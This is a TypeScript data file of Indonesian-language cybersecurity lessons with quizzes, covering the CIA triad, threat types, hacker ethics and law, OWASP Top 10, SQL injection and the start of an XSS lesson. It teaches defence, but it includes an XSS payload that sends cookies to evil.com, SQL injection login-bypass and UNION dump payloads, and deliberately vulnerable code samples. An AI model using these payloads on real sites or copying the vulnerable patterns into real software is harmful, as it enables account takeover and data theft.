import { MaterialData } from "./content-types";

export const contentLevels6to8: MaterialData[] = [
  // ==================== LEVEL 6 - CYBERSECURITY (14) ====================
  {
    level: 6,
    order: 1,
    title: "Pengenalan Cybersecurity",
    slug: "pengenalan-cybersecurity",
    description: "Mengenal cybersecurity, mengapa penting, dan peran security professional.",
    icon: "🛡️",
    isProject: false,
    content: `# Pengenalan Cybersecurity

**Cybersecurity** adalah praktik melindungi sistem komputer, jaringan, perangkat, dan data dari serangan digital yang berusaha mengakses, mengubah, atau menghancurkan informasi sensitif tanpa izin. Di era transformasi digital, hampir seluruh aspek kehidupan—mulai dari perbankan, kesehatan, pemerintahan, hingga rumah tangga—bergantung pada infrastruktur teknologi informasi. Oleh karena itu, keamanan siber bukan lagi tanggung jawab satu tim teknis saja, melainkan kepentingan seluruh organisasi dan setiap individu pengguna teknologi.

![Pengenalan Cybersecurity](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Mengapa Cybersecurity Sangat Penting

Setiap organisasi menyimpan data berharga: identitas pelanggan, transaksi keuangan, kekayaan intelektual, hingga rahasia dagang. Satu insiden kebocoran data dapat memicu kerugian finansial besar, merusak reputasi bertahun-tahun, hingga menarik sanksi hukum. Ransomware seperti WannaCry dan NotPetya pada 2017 menghentikan operasional rumah sakit, pelabuhan, dan pabrik global. Saat ini biaya rata-rata satu kebocoran data mencapai jutaan dolar, sehingga investasi pada keamanan jauh lebih murah dibanding biaya pemulihan pasca-insiden.

## Tujuan Utama Cybersecurity

1. **Mencegah (Prevent)** — membatasi permukaan serangan melalui hardening, patching, dan kontrol akses.
2. **Mendeteksi (Detect)** — mengenali anomali dan indikator kompromi sedini mungkin melalui monitoring.
3. **Menanggapi (Respond)** — melakukan kontainment, eradikasi, dan investigasi saat insiden terjadi.
4. **Memulihkan (Recover)** — mengembalikan layanan dan data ke kondisi normal serta menerapkan pelajaran.

Siklus ini dikenal sebagai **NIST Cybersecurity Framework** (Identify–Protect–Detect–Respond–Recover), standar de facto yang diadopsi organisasi global.

## Lanskap Ancaman Modern

Ancaman siber terus berkembang seiring teknologi. Beberapa kategori utama meliputi:

- **Malware** — virus, worm, trojan, ransomware, spyware.
- **Phishing & Social Engineering** — memanipulasi manusia untuk membocorkan kredensial.
- **Web Application Attacks** — SQL Injection, XSS, CSRF, hingga API abuse.
- **Supply Chain Attacks** — menyerang vendor atau pustaka pihak ketiga (contoh: SolarWinds).
- **DDoS** — membanjiri layanan hingga tidak tersedia.
- **Zero-Day Exploit** — menyerang kerentanan yang belum diketahui vendor.

## Peran Security Professional

\`\`\`text
- Security Analyst     : monitoring harian & analisis log di SOC
- Penetration Tester   : menyerang sistem secara legal untuk menemukan celah
- Security Engineer    : membangun & mengkonfigurasi pertahanan teknis
- Incident Responder   : menangani krisis saat serangan terjadi
- Forensic Analyst     : investigasi pasca-insiden & pengumpulan bukti
- Security Architect   : merancang arsitektur keamanan menyeluruh
- GRC Specialist       : kepatuhan, kebijakan, dan manajemen risiko
\`\`\`

## Audit Keamanan Cepat

\`\`\`bash
# Cek port terbuka di host
sudo netstat -tulpn | grep LISTEN

# Cek update keamanan tertunda (Debian/Ubuntu)
sudo apt list --upgradable 2>/dev/null | grep -i secur

# Cek user dengan privilege sudo
getent group sudo

# Cek kebijakan password
sudo chage -l $USER
\`\`\`

## Tips & Best Practices

- Terapkan **principle of least privilege** pada setiap akun dan layanan.
- Aktifkan **MFA** untuk semua akses administratif.
- Lakukan **patch management** otomatis dan terjadwal.
- Backup data dengan strategi **3-2-1** (3 salinan, 2 media, 1 offsite).
- Latih karyawan dengan simulasi phishing berkala.

## Kesimpulan

Cybersecurity adalah proses berkelanjutan, bukan produk sekali beli. Pertahanan terbaik menggabungkan teknologi, prosedur, dan kesadaran manusia. Dengan memahami ancaman, peran setiap profesi keamanan, dan siklus NIST, Anda telah meletakkan fondasi yang kuat untuk eksplorasi materi keamanan siber selanjutnya.`,
    quiz: [
      {
        question: "Apa tujuan utama cybersecurity?",
        options: ["Mempercepat koneksi internet", "Melindungi sistem, jaringan, dan data", "Menjual perangkat lunak", "Mengganti hardware lama"],
        answer: 1,
        explanation: "Cybersecurity melindungi sistem, jaringan, dan data dari serangan digital."
      },
      {
        question: "Peran yang menyerang sistem secara legal untuk menemukan celah?",
        options: ["SOC Engineer", "Penetration Tester", "Forensic Analyst", "Network Admin"],
        answer: 1,
        explanation: "Penetration Tester melakukan simulasi serangan dengan izin untuk menemukan kerentanan."
      },
      {
        question: "Perintah untuk melihat port yang sedang mendengarkan?",
        options: ["sudo netstat -tulpn | grep LISTEN", "ping localhost", "curl -I https://site", "ssh user@host"],
        answer: 0,
        explanation: "netstat -tulpn menampilkan port TCP/UDP yang sedang dalam status LISTEN."
      }
    ]
  },
  {
    level: 6,
    order: 2,
    title: "CIA Triad & Prinsip Keamanan",
    slug: "cia-triad-prinsip-keamanan",
    description: "Confidentiality, Integrity, Availability - tiga pilar keamanan informasi.",
    icon: "🎯",
    isProject: false,
    content: `# CIA Triad & Prinsip Keamanan

**CIA Triad** adalah model panduan keamanan informasi yang terdiri dari tiga pilar: Confidentiality, Integrity, dan Availability. Ketiganya menjadi tolok ukur untuk merancang, mengevaluasi, dan mengaudit sistem yang aman. Setiap kebijakan keamanan—dari enkripsi email hingga redundansi data center—dapat ditelusuri kembali ke salah satu dari ketiga pilar ini.

![CIA Triad & Prinsip Keamanan](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Confidentiality (Kerahasiaan)

Memastikan informasi hanya diakses oleh pihak yang berwenang. Teknik yang umum dipakai: enkripsi data at-rest dan in-transit, kontrol akses berbasis peran (RBAC), autentikasi multi-faktor, dan klasifikasi data. Pelanggaran confidentiality contohnya kebocoran database pelanggan, penyadapan jaringan tanpa enkripsi, atau layanan cloud yang salah konfigurasi sehingga bucket publik terbuka.

\`\`\`bash
# Set permission file SSH private key agar hanya owner yang bisa baca
chmod 600 ~/.ssh/id_rsa
ls -l ~/.ssh/id_rsa
# Output: -rw------- 1 user user 0 Jan 1 00:00 /home/user/.ssh/id_rsa
\`\`\`

## Integrity (Integritas)

Menjamin data tidak diubah, dihapus, atau dimanipulasi tanpa otorisasi. Hash dan checksum digunakan untuk mendeteksi perubahan. Contoh serangan terhadap integrity: SQL Injection yang mengubah saldo rekening, manipulasi log audit, atau serangan supply chain yang menyisipkan kode berbahaya ke dalam pustaka populer. Database transaksional menggunakan constraint, trigger, dan audit trail untuk menjaga integritas data.

\`\`\`bash
# Verifikasi integritas file ISO menggunakan SHA-256
sha256sum ubuntu-22.04.iso
# Bandingkan dengan hash resmi yang dipublikasikan Ubuntu
\`\`\`

## Availability (Ketersediaan)

Memastikan sistem dan data tersedia bagi pengguna yang berwenang kapan pun dibutuhkan. Serangan DDoS, ransomware, kegagalan hardware, atau bencana alam mengancam availability. Strategi mitigasi meliputi load balancing, redundansi multi-AZ, backup terjadwal, disaster recovery plan, dan auto-scaling. Service Level Agreement (SLA) seperti "99.99% uptime" adalah komitmen availability.

\`\`\`bash
# Cek uptime server dan beban rata-rata
uptime
# Output: 10:00:00 up 30 days, 1:20, 1 user, load average: 0.20, 0.15, 0.10
\`\`\`

## Prinsip Pendukung Keamanan

Selain CIA, ada prinsip pendukung yang memperkuat postur keamanan:

1. **Authentication** — memverifikasi identitas (siapa kamu?).
2. **Authorization** — menentukan hak akses (apa yang boleh kamu lakukan?).
3. **Non-repudiation** — pengirim tidak dapat menyangkal tindakannya (tanda tangan digital).
4. **Accountability** — setiap aksi dapat ditelusuri ke satu akun.
5. **Least Privilege** — berikan hak minimum yang diperlukan.
6. **Defense in Depth** — lapisan pertahanan berlapis.

## Tips & Best Practices

- Klasifikasikan data menjadi Public, Internal, Confidential, dan Restricted.
- Gunakan vault (HashiCorp Vault, AWS KMS) untuk menyimpan kunci rahasia.
- Lakukan backup terenkripsi dan uji restore secara berkala.
- Monitor perubahan file kritis dengan tools seperti Tripwire atau AIDE.
- Pisahkan jaringan produksi dan jaringan kantor (network segmentation).

## Kesimpulan

CIA Triad adalah kompas yang membantu arsitek keamanan membuat keputusan yang seimbang. Tidak ada sistem yang 100% aman, tetapi dengan memahami trade-off antara confidentiality, integrity, dan availability, Anda dapat merancang pertahanan yang proporsional terhadap risiko nyata.`,
    quiz: [
      {
        question: "Pilar CIA yang menjamin data tidak diubah tanpa izin?",
        options: ["Confidentiality", "Integrity", "Availability", "Authentication"],
        answer: 1,
        explanation: "Integrity menjamin data tidak diubah atau dimanipulasi tanpa otorisasi."
      },
      {
        question: "Serangan yang utamanya mengancam Availability?",
        options: ["SQL Injection", "Phishing", "DDoS", "XSS"],
        answer: 2,
        explanation: "DDoS membanjiri layanan hingga tidak tersedia bagi pengguna sah."
      },
      {
        question: "Prinsip memberikan hak minimum yang diperlukan disebut?",
        options: ["Defense in Depth", "Least Privilege", "Non-repudiation", "Accountability"],
        answer: 1,
        explanation: "Least Privilege membatasi hak akses sesuai kebutuhan minimum."
      }
    ]
  },
  {
    level: 6,
    order: 3,
    title: "Jenis Ancaman Cyber",
    slug: "jenis-ancaman-cyber",
    description: "Malware, phishing, DDoS, dan berbagai kategori ancaman siber modern.",
    icon: "⚠️",
    isProject: false,
    content: `# Jenis Ancaman Cyber

Lanskap ancaman siber sangat beragam—mulai dari script kiddie yang menjalankan tool siap pakai hingga kelompok APT (Advanced Persistent Threat) yang didukung negara. Memahami kategori ancaman adalah langkah pertama untuk membangun pertahanan yang efektif. Setiap ancaman memiliki vektor serangan, motivasi, dan teknik mitigasi yang berbeda.

![Jenis Ancaman Cyber](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Malware

Malware adalah perangkat lunak berbahaya yang dirancang untuk merusak, mencuri, atau mengontrol sistem. Jenis utamanya:

- **Virus** — menginfeksi file host dan menyebar saat file dijalankan.
- **Worm** — menyebar otomatis melalui jaringan tanpa intervensi pengguna.
- **Trojan** — menyamar sebagai aplikasi sah, membuka backdoor.
- **Ransomware** — mengenkripsi file korban dan meminta tebusan.
- **Spyware** — memata-matai aktivitas pengguna secara diam-diam.
- **Rootkit** — menyembunyikan diri di level kernel untuk bertahan.

\`\`\`bash
# Scan malware menggunakan ClamAV
sudo freshclam
sudo clamscan -r /home/

# Cek proses mencurigakan
ps aux | grep -iE "crypt|wget|curl|nc " | grep -v grep
\`\`\`

## Phishing & Social Engineering

Phishing adalah teknik menipu korban agar menyerahkan kredensial atau mengklik tautan berbahaya dengan menyamar sebagai entitas terpercaya. Variannya: **spear phishing** (tertarget), **whaling** (menargetkan eksekutif), **smishing** (SMS), dan **vishing** (telepon). Email phishing klasik mengklaim "Akun Anda akan diblokir, klik di sini" dan mengarahkan ke halaman login palsu.

## Serangan Jaringan

- **DDoS (Distributed Denial of Service)** — ribuan bot membanjiri server.
- **Man-in-the-Middle (MitM)** — penyadap di tengah komunikasi.
- **DNS Spoofing** — mengarahkan domain ke IP palsu.
- **Port Scanning** — reconnaissance untuk menemukan layanan terbuka (nmap).

\`\`\`bash
# Contoh scanning port dengan nmap (pada lab yang diizinkan)
nmap -sV -O --top-ports 1000 192.168.1.0/24

# Cek koneksi aktif mencurigakan
ss -tunap | grep ESTABLISHED
\`\`\`

## Serangan Aplikasi Web

OWASP mencatat risiko paling kritis pada aplikasi web: SQL Injection, XSS, Broken Authentication, Sensitive Data Exposure, XXE, Broken Access Control, Security Misconfiguration, Insecure Deserialization, Komponen dengan Kerentanan, dan Insufficient Logging. Aplikasi modern berbasis API juga rentan terhadap Broken Object Level Authorization (BOLA).

## Serangan Lanjutan (APT)

APT adalah kelompok aktor ancaman yang persisten, biasanya didukung negara atau sindikat kriminal besar. Mereka menggunakan teknik **kill chain** (recon → weaponize → deliver → exploit → install C2 → actions on objectives) dan bisa bertahan di jaringan korban berbulan-bulan tanpa terdeteksi. Contoh: APT28, APT29, Lazarus, FIN7.

## Tips & Best Practices

- Pasang EDR/antivirus modern dengan deteksi perilaku, bukan hanya signature.
- Latih karyawan mengenali email phishing melalui simulasi rutin.
- Implementasikan WAF (Web Application Firewall) untuk aplikasi publik.
- Gunakan threat intelligence feed (MISP, AlienVault OTX) untuk enrich log.
- Lakukan threat modeling sejak fase desain aplikasi.

## Kesimpulan

Mengenali jenis ancaman cyber membantu Anda memilih kontrol keamanan yang tepat. Tidak ada satu pertahanan yang efektif untuk semua ancaman—diperlukan pendekatan berlapis (defense in depth) yang menggabungkan teknologi, proses, dan edukasi manusia.`,
    quiz: [
      {
        question: "Malware yang mengenkripsi file korban dan meminta tebusan?",
        options: ["Trojan", "Spyware", "Ransomware", "Worm"],
        answer: 2,
        explanation: "Ransomware mengenkripsi data korban dan menuntut tebusan untuk dekripsi."
      },
      {
        question: "Phishing yang menargetkan eksekutif tingkat tinggi disebut?",
        options: ["Smishing", "Whaling", "Vishing", "Pharming"],
        answer: 1,
        explanation: "Whaling adalah spear phishing yang menargetkan pejabat tinggi (whale)."
      },
      {
        question: "Tools yang umum dipakai untuk scanning port?",
        options: ["Wireshark", "Nmap", "Metasploit", "Burp Suite"],
        answer: 1,
        explanation: "Nmap adalah scanner jaringan populer untuk menemukan host dan layanan."
      }
    ]
  },
  {
    level: 6,
    order: 4,
    title: "Etika & Legalitas Hacker",
    slug: "etika-legalitas-hacker",
    description: "Etika hacker, topi putih/hitam/abu, dan aspek hukum keamanan siber.",
    icon: "⚖️",
    isProject: false,
    content: `# Etika & Legalitas Hacker

Dunia peretasan tidak hanya soal teknis—ada garis tipis antara peneliti keamanan yang etis dan penjahat siber. Memahami etika dan kerangka hukum sangat penting agar keahlian Anda memberi nilai positif, bukan masalah pidana. Banyak negara memiliki undang-undang cybercrime yang ketat, dan ketidaktahuan bukan alasan pengampun.

![Etika & Legalitas Hacker](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Klasifikasi Topi Hacker

- **White Hat (Ethical Hacker)** — bekerja dengan izin untuk menemukan dan memperbaiki celah. Bekerja di tim internal, konsultan, atau bug bounty.
- **Black Hat** — menyerang tanpa izin untuk keuntungan pribadi, sabotase, atau pencurian data.
- **Gray Hat** — menemukan celah tanpa izin, tetapi melaporkannya ke vendor. Hukum di banyak negara tetap menganggap ini ilegal.
- **Red Team** — tim internal yang mensimulasikan serangan nyata untuk menguji pertahanan.
- **Blue Team** — tim pertahanan yang mendeteksi dan merespons serangan.
- **Purple Team** — kolaborasi red dan blue untuk meningkatkan kedua sisi.

## Prinsip Etika Hacker

1. **Consent** — selalu dapat izin tertulis sebelum melakukan pengujian.
2. **Do No Harm** — jangan merusak sistem atau data korban.
3. **Confidentiality** — laporan kerentanan hanya dibagikan ke pihak yang berwenang.
4. **Responsible Disclosure** — beri vendor waktu wajar (biasanya 90 hari) sebelum publikasi.
5. **Scope Compliance** — hanya uji cakupan yang disepakati, jangan "berkeliling" ke sistem lain.

## Kerangka Hukum di Indonesia

- **UU No. 11/2008 dan UU No. 19/2016 tentang ITE** — mengatur transaksi elektronik dan ancaman pidana untuk akses ilegal, peretasan, dan penyebaran konten ilegal.
- **UU No. 27/2022 tentang Pelindungan Data Pribadi (PDP)** — mewajibkan pengendali data melindungi data pribadi, dengan denda hingga 2% omzet tahunan.
- **PP No. 71/2019** — penyelenggaraan sistem dan transaksi elektronik.
- Pasal-pasal kunci ITE: Pasal 30 (akses ilegal), Pasal 33 (intercept), Pasal 35 (perubahan data), Pasal 40 (penghancuran data).

\`\`\`text
Sanksi pidana ITE dapat berupa:
- Penjara maksimal 6-12 tahun
- Denda hingga miliaran rupiah
- Pidana tambahan: perampasan keuntungan dan/atau alat
\`\`\`

## Hukum Internasional yang Relevan

- **CFAA (Computer Fraud and Abuse Act)** — AS, melarang akses tidak sah ke sistem komputer.
- **GDPR** — Eropa, melindungi data pribadi warga EU dengan denda hingga 4% omzet global.
- **Cybercrime Convention (Budapest Convention 2001)** — kerjasama internasional kejahatan siber.
- **Copyright Act / DMCA** — melarang penghindaran DRM dan distribusi tools peretasan.

## Bug Bounty & Responsible Disclosure

Platform seperti HackerOne, Bugcrowd, dan Synack menghubungkan peneliti dengan organisasi yang bersedia membayar kerentanan. Program seperti **CVE Numbering Authority (CNA)** memberi ID resmi pada kerentanan publik. VEP (Vulnerabilities Equities Process) mengatur apakah pemerintah mengungkap atau menyimpan zero-day.

\`\`\`text
Alur responsible disclosure:
1. Temukan bug → dokumentasi PoC non-destruktif
2. Hubungi vendor melalui security@ atau cert
3. Beri waktu patch (biasanya 90 hari)
4. Publikasi setelah patch dengan koordinasi vendor
5. Minta CVE ID jika relevan
\`\`\`

## Tips & Best Practices

- Selalu tandatangani **Rules of Engagement (RoE)** sebelum pentest.
- Simpan log aktivitas Anda sebagai bukti Anda bekerja dalam scope.
- Jangan pernah menyimpan data korban—cukup screenshot bukti konsep.
- Bergabung dengan komunitas etis (IDSECCONF, Hacking Wikipedia, OWASP ID).
- Baca EULA dan ToS setiap platform sebelum menguji.

## Kesimpulan

Keterampilan teknis perlu disertai kompas moral dan pemahaman hukum. Hacker etis menyelamatkan jutaan pengguna dengan laporan yang bertanggung jawab, sementara satu langkah salah bisa berujung pidana. Jadi, pilih topi putih—dunia sangat membutuhkan mereka.`,
    quiz: [
      {
        question: "Hacker yang bekerja dengan izin untuk menemukan celah?",
        options: ["Black Hat", "White Hat", "Gray Hat", "Script Kiddie"],
        answer: 1,
        explanation: "White Hat (ethical hacker) bekerja dengan izin dan etika yang jelas."
      },
      {
        question: "Undang-undang ITE di Indonesia adalah?",
        options: ["UU No. 11/2008", "UU No. 1/2023", "UU No. 20/2003", "UU No. 5/1999"],
        answer: 0,
        explanation: "UU No. 11/2008 tentang ITE (diperbarui UU 19/2016) mengatur kejahatan siber."
      },
      {
        question: "Praktik mengungkap kerentanan secara bertanggung jawab disebut?",
        options: ["Zero-day sell", "Full disclosure langsung", "Responsible disclosure", "Black market"],
        answer: 2,
        explanation: "Responsible disclosure memberi vendor waktu patch sebelum publikasi."
      }
    ]
  },
  {
    level: 6,
    order: 5,
    title: "OWASP Top 10",
    slug: "owasp-top-10",
    description: "Sepuluh risiko keamanan aplikasi web paling kritis menurut OWASP.",
    icon: "📋",
    isProject: false,
    content: `# OWASP Top 10

**OWASP (Open Worldwide Application Security Project)** menerbitkan daftar 10 risiko keamanan aplikasi web paling kritis yang diperbarui setiap beberapa tahun. Versi terbaru (2021) menjadi acuan standar industri untuk pengembangan aplikasi yang aman. Memahami OWASP Top 10 adalah kewajiban bagi setiap developer dan security engineer.

![OWASP Top 10](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## A01:2021 — Broken Access Control

 Kontrol akses yang salah mengizinkan pengguna melakukan aksi di luar haknya. Contoh: IDOR (Insecure Direct Object Reference), di mana pengguna mengubah \`?id=100\` menjadi \`?id=101\` dan mengakses data orang lain. Mitigasi: validasi otorisasi di server, gunakan token sesi acak, terapkan deny-by-default.

\`\`\`text
# Buruk
GET /api/orders/123  → server tidak cek ownership

# Baik
GET /api/orders/{uuid_acak}
+ server-side check: order.user_id == session.user_id
\`\`\`

## A02:2021 — Cryptographic Failures

Kegagalan kriptografi: data sensitif disimpan/transmisi tanpa enkripsi, algoritma lemah (MD5, DES), kunci hard-coded, atau TLS versi lama. Mitigasi: gunakan AES-256-GCM, TLS 1.3, hash password dengan bcrypt/argon2, rotasi kunci.

## A03:2021 — Injection

SQL Injection, NoSQL Injection, Command Injection, dan LDAP Injection masih marak. Input pengguna langsung dieksekusi sebagai kode. Mitigasi: parameterized query, ORM, input validation dengan allowlist.

\`\`\`python
# Buruk (rawak)
cursor.execute(f"SELECT * FROM users WHERE id = {user_input}")

# Baik (parameterized)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))
\`\`\`

## A04:2021 — Insecure Design

Risiko arsitektural—tidak ada threat modeling, logika bisnis yang lemah, kebijakan yang inkonsisten. Contoh: proses recovery password yang bisa ditebak. Mitigasi: secure design pattern, threat modeling sejak desain, libraries standar.

## A05:2021 — Security Misconfiguration

Default credential, error message verbose, layanan tidak perlu yang aktif, header keamanan hilang. Mitigasi: hardening guide, automated config scanner (CIS Benchmarks, Lynis).

\`\`\`nginx
# Header keamanan untuk Nginx
add_header X-Frame-Options "SAMEORIGIN";
add_header X-Content-Type-Options "nosniff";
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains";
add_header Content-Security-Policy "default-src 'self'";
\`\`\`

## A06:2021 — Vulnerable & Outdated Components

Menggunakan library/framework versi lama dengan CVE aktif. Mitigasi: Software Composition Analysis (SCA) seperti Snyk, Dependabot, OWASP Dependency-Check, dan patch berkala.

## A07:2021 — Identification & Authentication Failures

Credential stuffing, brute force, sesi yang tidak kedaluwarsa, MFA lemah. Mitigasi: rate limiting, CAPTCHA, MFA TOTP/WebAuthn, rotasi session ID pasca login.

## A08:2021 — Software & Data Integrity Failures

Kode/plugin dari sumber tidak tepercaya, CI/CD tanpa verifikasi integritas, deserialisasi data tidak tepercaya. Mitigasi: signed package, SBOM (Software Bill of Materials), pipeline dengan secret scan.

## A09:2021 — Security Logging & Monitoring Failures

Tidak ada log keamanan, atau log tidak dipantau. Insiden baru terdeteksi berbulan-bulan kemudian. Mitigasi: centralized logging (ELK, Splunk), SIEM, alerting, uji table-top.

## A10:2021 — Server-Side Request Forgery (SSRF)

Server membuat request ke URL yang ditentukan pengguna tanpa validasi—memungkinkan akses ke metadata cloud (169.254.169.254) atau layanan internal. Mitigasi: allowlist domain, blokir IP internal, network segmentation.

\`\`\`python
# Mitigasi SSRF
import ipaddress, urllib.parse
from urllib.parse import urlparse

def is_safe_url(url):
    p = urlparse(url)
    if p.scheme not in ("http", "https"):
        return False
    try:
        ip = ipaddress.ip_address(p.hostname)
        if ip.is_private or ip.is_loopback:
            return False
    except ValueError:
        return p.hostname in ALLOWED_DOMAINS
    return True
\`\`\`

## Tips & Best Practices

- Integrasikan OWASP ZAP atau Burp Suite dalam pipeline CI/CD.
- Latih developer dengan OWASP Secure Coding Practices.
- Gunakan ASVS (Application Security Verification Standard) untuk audit.
- Aktifkan security.txt di domain Anda.
- Lakukan pentest tahunan minimal sekali.

## Kesimpulan

OWASP Top 10 adalah checklist wajib untuk aplikasi web modern. Dengan mengenali pola risiko dan menerapkan mitigasi sejak desain, Anda mengurangi secara signifikan peluang eksploitasi. Keamanan adalah proses sepanjang siklus hidup aplikasi, bukan add-on di akhir.`,
    quiz: [
      {
        question: "Risiko di mana pengguna mengakses data orang lain dengan mengubah ID?",
        options: ["SSRF", "IDOR / Broken Access Control", "XSS", "Crypto Failure"],
        answer: 1,
        explanation: "IDOR adalah bentuk Broken Access Control yang umum di API REST."
      },
      {
        question: "Cara terbaik mencegah SQL Injection?",
        options: ["Escape manual", "Parameterized query", "Hidden field", "Disable error"],
        answer: 1,
        explanation: "Parameterized query memisahkan kode dan data sehingga input tidak dieksekusi sebagai SQL."
      },
      {
        question: "Risiko A10 OWASP 2021 yang baru ditambahkan?",
        options: ["SSRF", "XSS", "CSRF", "RCE"],
        answer: 0,
        explanation: "SSRF masuk sebagai A10:2021 menggantikan beberapa risiko lama."
      }
    ]
  },
  {
    level: 6,
    order: 6,
    title: "SQL Injection",
    slug: "sql-injection",
    description: "Teknik serangan, dampak, dan cara mencegah SQL Injection.",
    icon: "💉",
    isProject: false,
    content: `# SQL Injection

**SQL Injection (SQLi)** adalah teknik menyerang di mana penyerang menyisipkan perintah SQL berbahaya ke dalam input aplikasi untuk dimasukkan ke dalam query database. Konsekuensinya bisa sangat parah: pencurian data, bypass autentikasi, manipulasi data, hingga RCE (Remote Code Execution) pada konfigurasi tertentu. SQLi tetap menjadi salah satu risiko OWASP Top 10 meski sudah dikenal puluhan tahun.

![SQL Injection](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Bagaimana SQL Injection Bekerja

Aplikasi rentan biasanya menggabungkan string input pengguna langsung ke dalam query SQL:

\`\`\`python
# Kode rentan
username = request.form['username']
password = request.form['password']
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
cursor.execute(query)
\`\`\`

Penyerang mengirim \`username = admin' --\` dan \`password = x\`. Query yang dihasilkan:

\`\`\`sql
SELECT * FROM users WHERE username='admin' --' AND password='x'
\`\`\`

Bagian setelah \`--\` dianggap komentar, sehingga pengecekan password diabaikan. Penyerang login sebagai admin tanpa mengetahui password.

## Jenis SQL Injection

1. **In-band (Classic)** — hasil langsung dikembalikan ke penyerang (UNION-based, error-based).
2. **Inferential (Blind)** — tidak ada data langsung, penyerang menyimpulkan dari perilaku (boolean-based, time-based).
3. **Out-of-band** — respons via channel lain (DNS, HTTP request) bila server tidak mendukung in-band.

## Contoh UNION-based SQLi

Asumsikan query asli: \`SELECT name, description FROM products WHERE id=1\`.

\`\`\`sql
-- Payload: 1 UNION SELECT username, password FROM users
SELECT name, description FROM products WHERE id=1
UNION SELECT username, password FROM users;
\`\`\`

Hasilnya: kolom name/description produk digabung dengan username/password tabel users.

## Contoh Blind Time-based

\`\`\`sql
-- Payload: 1; IF(SUBSTRING((SELECT TOP 1 password FROM users),1,1)='a') WAITFOR DELAY '0:0:5' --
\`\`\`

Jika respons lambat 5 detik, karakter pertama password adalah 'a'. Penyerang brute-force karakter demi karakter.

## Dampak SQL Injection

- **Pencurian data** — kartu kredit, kredensial, data pribadi.
- **Bypass autentikasi** — login sebagai user/admin mana pun.
- **Manipulasi data** — ubah saldo, hapus record.
- **RCE** — via \`xp_cmdshell\` (SQL Server), \`INTO OUTFILE\` (MySQL), atau \`COPY FROM PROGRAM\` (PostgreSQL).
- **Lateral movement** — pivot ke jaringan internal.

## Cara Mencegah SQL Injection

**1. Parameterized Query / Prepared Statement**

\`\`\`python
# Python psycopg2 / MySQL connector
cursor.execute(
    "SELECT * FROM users WHERE username=%s AND password=%s",
    (username, password)
)
\`\`\`

\`\`\`javascript
// Node.js dengan pg
const res = await pool.query(
    'SELECT * FROM users WHERE username=$1 AND password=$2',
    [username, password]
);
\`\`\`

**2. ORM modern** (Prisma, SQLAlchemy, Hibernate) yang otomatis parameterized.

**3. Input validation** dengan allowlist, bukan blocklist.

**4. Least privilege** — akun DB aplikasi tidak boleh punya hak \`DROP\`, \`xp_cmdshell\`, atau akses ke tabel sistem.

**5. WAF** sebagai lapisan tambahan (Cloudflare, ModSecurity).

## Mendeteksi SQL Injection

\`\`\`bash
# Tools otomatis
sqlmap -u "https://target.com/product?id=1" --batch --dbs

# Tes manual dengan payload klasik
# ' OR '1'='1
# 1' AND SLEEP(5)--
# 1 UNION SELECT NULL,NULL,NULL--
\`\`\`

## Tips & Best Practices

- Gunakan stored procedure dengan parameter binding bila memungkinkan.
- Escape output jika harus menyusun SQL secara dinamis (risiko terakhir).
- Aktifkan log query lambat (slow query log) untuk mendeteksi time-based SQLi.
- Lakukan SAST (Static Application Security Testing) dengan Semgrep / CodeQL.
- Lakukan pentest aplikasi minimal sekali setahun.

## Kesimpulan

SQL Injection adalah salah satu risiko paling berdampak namun paling mudah dicegah. Kunci utamanya: **jangan pernah mempercayai input pengguna, selalu gunakan parameterized query**. Dengan disiplin penggunaan ORM dan parameter binding, Anda dapat mengeliminasi 99% vektor SQLi pada aplikasi modern.`,
    quiz: [
      {
        question: "Cara paling efektif mencegah SQL Injection?",
        options: ["Escape karakter manual", "Parameterized query", "Filter keyword UNION", "Sembunyikan pesan error"],
        answer: 1,
        explanation: "Parameterized query memisahkan kode SQL dari data sehingga input tidak dieksekusi sebagai perintah."
      },
      {
        question: "Jenis SQLi yang menyimpulkan dari waktu respons?",
        options: ["UNION-based", "Error-based", "Time-based blind", "Out-of-band"],
        answer: 2,
        explanation: "Time-based blind SQLi menggunakan SLEEP/WAITFOR dan mengukur delay respons."
      },
      {
        question: "Payload yang umum untuk bypass login tanpa password?",
        options: ["admin' --", "<script>alert(1)</script>", "../../etc/passwd", "<svg onload=...>"],
        answer: 0,
        explanation: "admin' -- membuat sisa query dianggap komentar, mengabaikan pengecekan password."
      }
    ]
  },
  {
    level: 6,
    order: 7,
    title: "Cross-Site Scripting XSS",
    slug: "xss-cross-site-scripting",
    description: "XSS Stored, Reflected, DOM-based dan cara mencegahnya.",
    icon: "🌐",
    isProject: false,
    content: `# Cross-Site Scripting (XSS)

**XSS** adalah kerentanan di mana penyerang menyisipkan script (biasanya JavaScript) ke halaman web yang dilihat pengguna lain. Script ini dieksekusi di browser korban dalam konteks aplikasi yang dipercaya, sehingga dapat mencuri cookie sesi, mengubah konten, atau melakukan aksi atas nama korban. XSS adalah salah satu risiko paling umum di aplikasi web dan masuk dalam OWASP Top 10.

![Cross-Site Scripting](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Tiga Jenis XSS

### 1. Stored (Persistent) XSS
Script berbahaya disimpan permanen di server (misalnya kolom komentar). Setiap pengguna yang melihat halaman tersebut akan terinfeksi. Paling berbahaya karena mencapai banyak korban.

\`\`\`text
Komentar: <script>fetch('//evil.com?c='+document.cookie)</script>
\`\`\`

### 2. Reflected (Non-persistent) XSS
Script disisipkan via URL/parameter dan dipantulkan langsung ke halaman respons. Biasanya menargetkan satu korban melalui phishing link.

\`\`\`text
https://target.com/search?q=<script>alert(document.cookie)</script>
\`\`\`

### 3. DOM-based XSS
Eksekusi terjadi murni di sisi client akibat manipulasi DOM yang tidak aman, tanpa interaksi server.

\`\`\`javascript
// Rentan
document.getElementById('greeting').innerHTML = location.hash.substring(1);
\`\`\`

## Dampak XSS

- **Session hijacking** — pencurian cookie \`document.cookie\`.
- **Credential harvesting** — form login palsu yang mengirim kredensial ke server penyerang.
- **Keylogging** — menangkap ketikan pengguna.
- **Browser exploit** — kombinasi dengan kerentanan browser untuk RCE.
